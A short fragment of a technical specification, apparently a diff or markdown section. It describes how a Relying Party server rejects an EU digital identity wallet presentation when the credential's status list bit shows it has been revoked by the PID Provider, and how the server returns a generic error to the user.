+<summary><strong>12. Relying Party Server rejects presentation — credential status REVOKED by PID Provider (bit = 1)</strong></summary>
 
 If the extracted status value is `1` (or any non-zero value for `bits=1`), the credential has been revoked or suspended by the PID Provider. The RP **MUST** reject the entire presentation — even if the issuer signature, disclosures, and KB-JWT are all valid. Common revocation reasons include: User-reported lost/stolen device, PID Provider-initiated suspension (e.g., identity fraud investigation), cascade revocation due to Wallet Unit compromise (CIR 2024/2977 Art. 5.4(b)), or credential expiry-forced revocation. The RP should return a generic error to the User (*"Credential could not be verified"*) without disclosing the specific revocation reason.
 
